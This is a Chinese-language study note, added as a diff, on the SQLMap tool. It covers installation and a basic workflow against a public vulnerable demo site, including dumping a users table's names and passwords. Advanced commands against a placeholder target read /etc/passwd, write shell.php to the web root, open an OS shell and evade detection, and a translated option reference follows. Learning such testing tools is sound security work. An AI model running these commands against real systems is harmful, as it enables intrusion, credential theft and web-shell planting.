@@ -1,0 +1,369 @@
+### 前言
+- 在学习Web攻防时，不可避免会涉及到sql注入这个知识点，而SQLMAP就是一个开源的自动化SQL注入检测与利用的工具。因此，为了便于我之后的使用与复习，我把它的重点部分作了一个总结，至于其他大而全的知识点，读者可以去网上或官网具体了解一下。
+### SQLMAP介绍
+- SQLMap 是一个开源的自动化SQL注入检测与利用工具，用于检测、利用和接管数据库服务器的安全漏洞。
+### SQLMAP安装
+- GitHub官网上下载tar或zip源代码
+- Git仓库直接获取
+	- `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
+### SQLMAP基础使用流程
+- GET请求作为示例
+	- 环境准备与基础检测
+		- 安装SQLMAP
+			- `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git`
+			- `cd sqlmap`
+		- 验证安装
+			- `python sqlmap.py --version`
+		- 基础检测
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch` 
+				- -u 指定目标URL
+				- --batch 自动选择默认选项，无需交互确认
+			- 在检测的过程会在你的sqlmap项目目录中创建一个output文件夹，用于保存你注入时的数据，方便后续查看
+	- 信息收集与枚举
+		- 获取数据库基本信息
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" \`
+			  `--current-user \`
+			  `--current-db \`
+			  `--is-dba \`
+			  `--hostname \`
+			  `--batch`
+				- `--current-user`：获取当前数据库用户
+				- `--current-db`：获取当前数据库名
+				- `--is-dba`：检查用户是否为管理员
+				- `--hostname`：获取数据库服务器主机名
+		- 枚举所有数据库
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch`
+				- `--dbs`：枚举所有可访问的数据库
+		- 枚举目标数据库的表
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch`
+				- `-D`：指定目标数据库
+				- `--tables`：枚举指定数据库的所有表
+		- 枚举users表的列结构
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart  -T users --columns --batch`
+				- - `-T`：指定目标表
+				- `--columns`：枚举指定表的所有列
+	- 数据提取与分析
+		- 统计users表的数据量
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  -D acuart   -T users --count --batch`
+				- `--count`：统计表中的记录数
+		- 提取指定列的数据
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"  -D acuart  -T users  -C "uname,pass" --dump --batch`
+				- `-C`：指定要提取的列
+				- `--dump`：导出数据
+		- 完整导出users表数据
+			- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users  --dump --batch`
+### SQLMAP进阶使用
+- 权限操作
+	- 判断权限
+		- `python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --current-user --current-db --is-dba --hostname --batch`
+				`--current-user：获取当前数据库用户`
+				`--current-db：获取当前数据库名`
+				`--is-dba：检查用户是否为管理员`
+				`--hostname：获取数据库服务器主机名`
+	- 文件操作
+		- 读取服务器文件
+			- `python sqlmap.py -u "http://target.com/product.php?id=1" --file-read="/etc/passwd"`
+				- `--file-read` 要读取数据库系统文件
+		- 将本地文件写入到远程服务器
+			- `python sqlmap.py -u "http://target.com/product.php?id=1" --file-write="shell.php"  --file-dest="/var/www/html/uploads/shell.php"`
+				- `--file-write` 要写入的文件
+				- `--file-dest` 要写入文件的位置的指定路径
+	- 操作系统交互
+		- 单个操作系统命令
+			- `python sqlmap.py -u "http://target.com/product.php?id=1" --os-cmd="whoami"python sqlmap.py -u "http://target.com/product.php?id=1" --os-cmd="whoami"`
+				- `--os-cmd` 单个操作系统命令
+		- 交互式操作系统shell
+			- `python sqlmap.py -u "http://target.com/product.php?id=1" --os-shell`
+				- `--os-shell` 交互式操作系统命令
+- 提交方法
+	-  POST数据注入
+		- `python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=12345" --method=POST -p "username,password" --batch`
+			- `--data`：POST请求体，格式为`参数1=值1&参数2=值2`
+			- `--method`：指定HTTP方法为POST
+			- `-p`：指定要测试的参数，用逗号分隔
+	- Cookie认证绕过注入
+		- `python sqlmap.py -u "http://target.com/profile.php?id=1" --cookie="PHPSESSID=abc123def456; csrf_token=xyz789" --batch`
+			- `--cookie`：设置Cookie头，格式为`name1=value1; name2=value2`
+	- JSON格式数据注入
+		- `python sqlmap.py -u "http://target.com/api/user/profile" --data='{"id":1,"name":"admin"}' --headers="Content-Type: application/json" --method=POST  -p "id" --batch`
+			- `--headers`：设置HTTP请求头
+			- Content-Type必须设置为`application/json`
+	- 从文件加载请求（-r参数）
+		- `python sqlmap.py -r request.txt --batch`
+			- request.txy文件示例
+				`POST /api/v1/login HTTP/1.1`
+				`Host: target.com`
+				`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+				`Accept: application/json`
+				`Content-Type: application/json`
+				`X-API-Key: 12345abcde`
+				`Cookie: session=xyz123; token=abc456`
+				`Content-Length: 52`
+				`{"username":"admin","password":"SuperSecret123!"}`
+			- 文件中标注注入点
+				- *
+- 绕过方法
+	- 内置Tamper脚本使用
+		`python sqlmap.py -u "http://target.com/api/decode"  --data="data=MQ==" --tamper="base64encode"  -v 3 --batch`
+			`--tamper` 使用SQLMAP自带的脚本
+- 分析扩展
+	- 后期分析调试
+		- 详细等级
+			- `python sqlmap.py -u "http://target.com/test.php?id=1" -v 3 --batch`
+				- `-v 0-6`  详细级别调试（信息展示的级别）
+		- 代理注入
+			- `python sqlmap.py -u "http://target.com/page.php?id=1"  --proxy="http://127.0.0.1:8080" -v 4  --batch`
+				- `--proxy` 代理URL
+	- 打乱默认指纹
+		- `python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"  -v 4 --batch`
+			- 自定义User-Agent
+		- `python sqlmap.py -u "http://target.com/page.php?id=1" --random-agent --batch`
+			- 随机User-Agent
+		- `python sqlmap.py -u "http://target.com/page.php?id=1"  --delay=2 --batch`
+			- 基础延迟
+		- `python sqlmap.py -u "http://target.com/page.php?id=1" --time-sec=10 --technique="T" --batch`
+			- 时间盲注延
+	- 测试Header注入
+		- 测试水平
+			- `python sqlmap.py -u "http://target.com/page.php?id=1" --level=3 --batch`
+		- 测试风险
+			- `python sqlmap.py -u "http://target.com/page.php?id=1" --risk=2 --technique="T" --batch`
+		- 测试Referer头
+			- `python sqlmap.py -u "http://target.com/page.php" --level=3 --headers="Referer: http://google.com" --batch`
+### SQLMAP 参数详解手册
+- 基本帮助信息
+	- `用法: python sqlmap.py [选项]`  
+		- `选项:`  
+		- `-h, --help: 显示基本帮助信息并退出`  
+		- `-hh: 显示高级帮助信息并退出`  
+		- `--version: 显示程序版本号并退出`  
+		- `-v VERBOSE: 详细级别: 0-6 (默认 1)`
+- 目标选项
+	- `至少需要提供以下选项之一来定义目标`  
+		- `-u URL, --url=URL: 目标URL (例如 "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)")`  
+		- `-d DIRECT: 直接数据库连接字符串`  
+		- `-l LOGFILE: 从Burp或WebScarab代理日志文件解析目标`  
+		- `-m BULKFILE: 扫描文本文件中给出的多个目标`  
+		- `-r REQUESTFILE: 从文件加载HTTP请求`  
+		- `-g GOOGLEDORK: 处理Google搜索语法结果作为目标URL`  
+		- `-c CONFIGFILE: 从配置文件INI加载选项`
+- 请求选项
+	- `这些选项用于指定如何连接到目标URL`  
+		- `-A AGENT, --user-agent=AGENT: HTTP User-Agent头值`  
+		- `-H HEADER, --header=HEADER: 额外HTTP头 (例如 "X-Forwarded-For: 127.0.0.1")`  
+		- `--method=METHOD: 强制使用指定的HTTP方法 (例如 PUT)`  
+		- `--data=DATA: 通过POST发送的数据字符串 (例如 "id=1")`  
+		- `--param-del=PARAMDEL: 用于分割参数值的字符 (例如 &)`  
+		- `--cookie=COOKIE: HTTP Cookie头值 (例如 "PHPSESSID=a8d127e..")`  
+		- `--cookie-del=COOKIEDEL: 用于分割cookie值的字符 (例如 ;)`  
+		- `--live-cookies=LIVECOOKIES: 用于加载最新值的实时cookies文件`  
+		- `--load-cookies=LOADCOOKIES: 包含Netscape/wget格式cookie的文件`  
+		- `--drop-set-cookie: 忽略响应中的Set-Cookie头`  
+		- `--mobile: 模拟智能手机的HTTP User-Agent头`  
+		- `--random-agent: 使用随机选择的HTTP User-Agent头值`  
+		- `--host=HOST: HTTP Host头值`  
+		- `--referer=REFERER: HTTP Referer头值`  
+		- `--headers=HEADERS: 额外HTTP头 (例如 "Accept-Language: fr\nETag: 123")`  
+		- `--auth-type=AUTHTYPE: HTTP认证类型 (Basic, Digest, NTLM或PKI)`  
+		- `--auth-cred=AUTHCRED: HTTP认证凭证 (用户名:密码)`  
+		- `--auth-file=AUTHFILE: HTTP认证PEM证书/私钥文件`  
+		- `--ignore-code=IGNORECODE: 忽略(有问题的)HTTP错误码 (例如 401)`  
+		- `--ignore-proxy: 忽略系统默认代理设置`  
+		- `--ignore-redirects: 忽略重定向尝试`  
+		- `--ignore-timeouts: 忽略连接超时`  
+		- `--proxy=PROXY: 使用代理连接到目标URL`  
+		- `--proxy-cred=PROXYCRED: 代理认证凭证 (用户名:密码)`  
+		- `--proxy-file=PROXYFILE: 从文件加载代理列表`  
+		- `--proxy-freq=PROXYFREQ: 在给定列表中更改代理之间的请求数`  
+		- `--tor: 使用Tor匿名网络`  
+		- `--tor-port=TORPORT: 设置Tor代理端口(非默认端口)`  
+		- `--tor-type=TORTYPE: 设置Tor代理类型 (HTTP, SOCKS4或SOCKS5(默认))`  
+		- `--check-tor: 检查Tor是否正确使用`  
+		- `--delay=DELAY: 每个HTTP请求之间的延迟秒数`  
+		- `--timeout=TIMEOUT: 连接超时前的等待秒数 (默认 30)`  
+		- `--retries=RETRIES: 连接超时时的重试次数 (默认 3)`  
+		- `--randomize=RPARAM: 随机更改给定参数的值`  
+		- `--safe-url=SAFEURL: 测试期间经常访问的URL地址`  
+		- `--safe-post=SAFEPOST: 发送到安全URL的POST数据`  
+		- `--safe-req=SAFEREQ: 从文件加载安全的HTTP请求`  
+		- `--safe-freq=SAFEFREQ: 访问安全URL之间的常规请求数`  
+		- `--skip-urlencode: 跳过payload数据的URL编码`  
+		- `--csrf-token=CSRFTOKEN: 用于保存反CSRF令牌的参数`  
+		- `--csrf-url=CSRFURL: 用于提取反CSRF令牌的URL地址`  
+		- `--csrf-method=CSRFMETHOD: 访问反CSRF令牌页面时使用的HTTP方法`  
+		- `--csrf-retries=CSRFRETRIES: 反CSRF令牌检索的重试次数 (默认 0)`  
+		- `--force-ssl: 强制使用SSL/HTTPS`  
+		- `--chunked: 使用HTTP分块传输编码(POST)请求`  
+		- `--hpp: 使用HTTP参数污染方法`  
+		- `--eval=EVALCODE: 请求前评估提供的Python代码 (例如 "import hashlib;id2=hashlib.md5(id).hexdigest()")`
+- 优化选项
+	- `这些选项可用于优化sqlmap的性能`  
+		- `-o: 开启所有优化开关`  
+		- `--predict-output: 预测常见查询输出`  
+		- `--keep-alive: 使用持久HTTP(s)连接`  
+		- `--null-connection: 检索页面长度而不获取实际的HTTP响应体`  
+		- `--threads=THREADS: 最大并发HTTP(s)请求数 (默认 1)`
+- 注入选项
+	- `这些选项可用于指定要测试的参数、提供自定义注入payload和可选的篡改脚本`  
+		- `-p TESTPARAMETER: 可测试的参数`  
+		- `--skip=SKIP: 跳过测试给定的参数`  
+		- `--skip-static: 跳过测试似乎不是动态的参数`  
+		- `--param-exclude=PARAMEXCLUDE: 用于从测试中排除参数的正则表达式 (例如 "ses")`  
+		- `--param-filter=PARAMFILTER: 按位置选择可测试参数 (例如 "POST")`  
+		- `--dbms=DBMS: 强制后端DBMS为提供的值`  
+		- `--dbms-cred=DBMSCRED: DBMS认证凭证 (用户:密码)`  
+		- `--os=OS: 强制后端DBMS操作系统为提供的值`  
+		- `--invalid-bignum: 使用大数字使值无效`  
+		- `--invalid-logical: 使用逻辑操作使值无效`  
+		- `--invalid-string: 使用随机字符串使值无效`  
+		- `--no-cast: 关闭payload转换机制`  
+		- `--no-escape: 关闭字符串转义机制`  
+		- `--prefix=PREFIX: 注入payload前缀字符串`  
+		- `--suffix=SUFFIX: 注入payload后缀字符串`  
+		- `--tamper=TAMPER: 使用给定脚本篡改注入数据`
+- 检测选项
+	- `这些选项可用于自定义检测阶段`  
+		- `--level=LEVEL: 要执行的测试级别 (1-5, 默认 1)`  
+		- `--risk=RISK: 要执行的测试风险 (1-3, 默认 1)`  
+		- `--string=STRING: 当查询评估为True时要匹配的字符串`  
+		- `--not-string=NOTSTRING: 当查询评估为False时要匹配的字符串`  
+		- `--regexp=REGEXP: 当查询评估为True时要匹配的正则表达式`  
+		- `--code=CODE: 当查询评估为True时要匹配的HTTP代码`  
+		- `--smart: 仅在启发式检测为阳性时执行全面测试`  
+		- `--text-only: 仅基于文本内容比较页面`  
+		- `--titles: 仅基于标题比较页面`
+- 技术选项
+	- `这些选项可用于调整特定SQL注入技术的测试`  
+		- `--technique=TECHNIQUE: 使用的SQL注入技术 (默认 "BEUSTQ")`  
+		- `--time-sec=TIMESEC: DBMS响应延迟秒数 (默认 5)`  
+		- `--union-cols=UCOLS: 测试UNION查询SQL注入的列范围`  
+		- `--union-char=UCHAR: 用于暴力破解列数的字符`  
+		- `--union-from=UFROM: 在UNION查询SQL注入的FROM部分中使用的表`  
+		- `--dns-domain=DNSDOMAIN: 用于DNS数据渗透攻击的域名`  
+		- `--second-url=SECONDURL: 搜索二阶响应的结果页面URL`  
+		- `--second-req=SECONDREQ: 从文件加载二阶HTTP请求`
+- 指纹识别选项
+	- `-f, --fingerprint: 执行广泛的DBMS版本指纹识别`
+- 枚举选项
+	- `这些选项可用于枚举后端数据库管理系统信息、结构以及表中包含的数据`  
+		- `-a, --all: 检索所有信息`  
+		- `-b, --banner: 检索DBMS横幅信息`  
+		- `--current-user: 检索DBMS当前用户`  
+		- `--current-db: 检索DBMS当前数据库`  
+		- `--hostname: 检索DBMS服务器主机名`  
+		- `--is-dba: 检测DBMS当前用户是否为DBA`  
+		- `--users: 枚举DBMS用户`  
+		- `--passwords: 枚举DBMS用户密码哈希`  
+		- `--privileges: 枚举DBMS用户权限`  
+		- `--roles: 枚举DBMS用户角色`  
+		- `--dbs: 枚举DBMS数据库`  
+		- `--tables: 枚举DBMS数据库表`  
+		- `--columns: 枚举DBMS数据库表列`  
+		- `--schema: 枚举DBMS模式`  
+		- `--count: 检索表的条目数`  
+		- `--dump: 转储DBMS数据库表条目`  
+		- `--dump-all: 转储所有DBMS数据库表条目`  
+		- `--search: 搜索列、表和/或数据库名称`  
+		- `--comments: 在枚举期间检查DBMS注释`  
+		- `--statements: 检索在DBMS上运行的SQL语句`  
+		- `-D DB: 要枚举的DBMS数据库`  
+		- `-T TBL: 要枚举的DBMS数据库表`  
+		- `-C COL: 要枚举的DBMS数据库表列`  
+		- `-X EXCLUDE: 不枚举的DBMS数据库标识符`  
+		- `-U USER: 要枚举的DBMS用户`  
+		- `--exclude-sysdbs: 枚举表时排除DBMS系统数据库`  
+		- `--pivot-column=PIVOTCOLUMN: 透视列名`  
+		- `--where=DUMPWHERE: 表转储时使用WHERE条件`  
+		- `--start=LIMITSTART: 要检索的第一个转储表条目`  
+		- `--stop=LIMITSTOP: 要检索的最后一个转储表条目`  
+		- `--first=FIRSTCHAR: 要检索的第一个查询输出字符`  
+		- `--last=LASTCHAR: 要检索的最后一个查询输出字符`  
+		- `--sql-query=SQLQUERY: 要执行的SQL语句`  
+		- `--sql-shell: 交互式SQL shell提示`  
+		- `--sql-file=SQLFILE: 执行给定文件中的SQL语句`
+- 暴力破解选项
+	- `这些选项可用于运行暴力破解检查`  
+		- `--common-tables: 检查常见表的存在`  
+		- `--common-columns: 检查常见列的存在`  
+		- `--common-files: 检查常见文件的存在`
+- 用户定义函数注入选项
+	- `这些选项可用于创建自定义用户定义函数`  
+		- `--udf-inject: 注入自定义用户定义函数`  
+		- `--shared-lib=SHLIB: 共享库的本地路径`
+- 文件系统访问选项
+	- `这些选项可用于访问后端数据库管理系统底层文件系统`  
+		- `--file-read=FILEREAD: 从后端DBMS文件系统读取文件`  
+		- `--file-write=FILEWRITE: 在后端DBMS文件系统上写入本地文件`  
+		- `--file-dest=FILEDEST: 要写入的后端DBMS绝对文件路径`
+- 操作系统访问选项
+	- `这些选项可用于访问后端数据库管理系统底层操作系统`  
+		- `--os-cmd=OSCMD: 执行操作系统命令`  
+		- `--os-shell: 交互式操作系统shell提示`  
+		- `--os-pwn: OOB shell、Meterpreter或VNC提示`  
+		- `--os-smbrelay: 一键获取OOB shell、Meterpreter或VNC`  
+		- `--os-bof: 存储过程缓冲区溢出利用`  
+		- `--priv-esc: 数据库进程用户权限提升`  
+		- `--msf-path=MSFPATH: 安装Metasploit Framework的本地路径`  
+		- `--tmp-path=TMPPATH: 临时文件目录的远程绝对路径`
+- Windows注册表访问选项
+	- `这些选项可用于访问后端数据库管理系统Windows注册表`  
+		- `--reg-read: 读取Windows注册表键值`  
+		- `--reg-add: 写入Windows注册表键值数据`  
+		- `--reg-del: 删除Windows注册表键值`  
+		- `--reg-key=REGKEY: Windows注册表键`  
+		- `--reg-value=REGVAL: Windows注册表键值`  
+		- `--reg-data=REGDATA: Windows注册表键值数据`  
+		- `--reg-type=REGTYPE: Windows注册表键值类型`
+- 常规选项
+	- `这些选项可用于设置一些常规工作参数`  
+		- `-s SESSIONFILE: 从存储的(.sqlite)文件加载会话`  
+		- `-t TRAFFICFILE: 将所有HTTP流量记录到文本文件`  
+		- `--answers=ANSWERS: 设置预定义答案 (例如 "quit=N,follow=N")`  
+		- `--base64=BASE64PARAM: 包含Base64编码数据的参数`  
+		- `--base64-safe: 使用URL和文件名安全的Base64字母表(RFC 4648)`  
+		- `--batch: 从不要求用户输入，使用默认行为`  
+		- `--binary-fields=BINARYFIELDS: 具有二进制值的结果字段 (例如 "digest")`  
+		- `--check-internet: 在评估目标之前检查Internet连接`  
+		- `--cleanup: 从sqlmap特定的UDF和表中清理DBMS`  
+		- `--crawl=CRAWLDEPTH: 从目标URL开始爬取网站`  
+		- `--crawl-exclude=CRAWLEXCLUDE: 从爬取中排除页面的正则表达式 (例如 "logout")`  
+		- `--csv-del=CSVDEL: CSV输出中使用的分隔字符 (默认 ",")`  
+		- `--charset=CHARSET: 盲注SQL注入字符集 (例如 "0123456789abcdef")`  
+		- `--dump-format=DUMPFORMAT: 转储数据的格式 (CSV(默认), HTML或SQLITE)`  
+		- `--encoding=ENCODING: 用于数据检索的字符编码 (例如 GBK)`  
+		- `--eta: 为每个输出显示预计到达时间`  
+		- `--flush-session: 刷新当前目标的会话文件`  
+		- `--forms: 解析和测试目标URL上的表单`  
+		- `--fresh-queries: 忽略会话文件中存储的查询结果`  
+		- `--gpage=GOOGLEPAGE: 使用指定页码的Google搜索语法结果`  
+		- `--har=HARFILE: 将所有HTTP流量记录到HAR文件`  
+		- `--hex: 在数据检索期间使用十六进制转换`  
+		- `--output-dir=OUTPUTDIR: 自定义输出目录路径`  
+		- `--parse-errors: 从响应中解析和显示DBMS错误消息`  
+		- `--preprocess=PREPROCESS: 使用给定脚本进行预处理(请求)`  
+		- `--postprocess=POSTPROCESS: 使用给定脚本进行后处理(响应)`  
+		- `--repair: 重新转储具有未知字符标记(?)的条目`  
+		- `--save=SAVECONFIG: 将选项保存到配置文件INI`  
+		- `--scope=SCOPE: 用于过滤目标的正则表达式`  
+		- `--skip-heuristics: 跳过SQLi/XSS漏洞的启发式检测`  
+		- `--skip-waf: 跳过WAF/IPS保护的启发式检测`  
+		- `--table-prefix=TABLREFIX: 临时表的前缀 (默认: "sqlmap")`  
+		- `--test-filter=TESTFILTER: 通过payload和/或标题选择测试 (例如 ROW)`  
+		- `--test-skip=TESTSKIP: 通过payload和/或标题跳过测试 (例如 BENCHMARK)`  
+		- `--web-root=WEBROOT: Web服务器文档根目录 (例如 "/var/www")`
+- 杂项选项
+	- `这些选项不适合任何其他类别`  
+		- `-z MNEMONICS: 使用短助记符 (例如 "flu,bat,ban,tec=EU")`  
+		- `--alert=ALERT: 找到SQL注入时运行主机操作系统命令`  
+		- `--beep: 在问题和/或找到SQLi/XSS/FI时发出哔声`  
+		- `--dependencies: 检查缺少的(可选)sqlmap依赖项`  
+		- `--disable-coloring: 禁用控制台输出着色`  
+		- `--list-tampers: 显示可用篡改脚本列表`  
+		- `--offline: 离线工作(仅使用会话数据)`  
+		- `--purge: 安全删除sqlmap数据目录中的所有内容`  
+		- `--results-file=RESULTSFILE: 多目标模式下CSV结果文件的位置`  
+		- `--shell: sqlmap交互式shell提示`  
+		- `--tmp-dir=TMPDIR: 用于存储临时文件的本地目录`  
+		- `--unstable: 调整不稳定连接的选项`  
+		- `--update: 更新sqlmap`  
+		- `--wizard: 为初学者用户提供的简单向导界面`
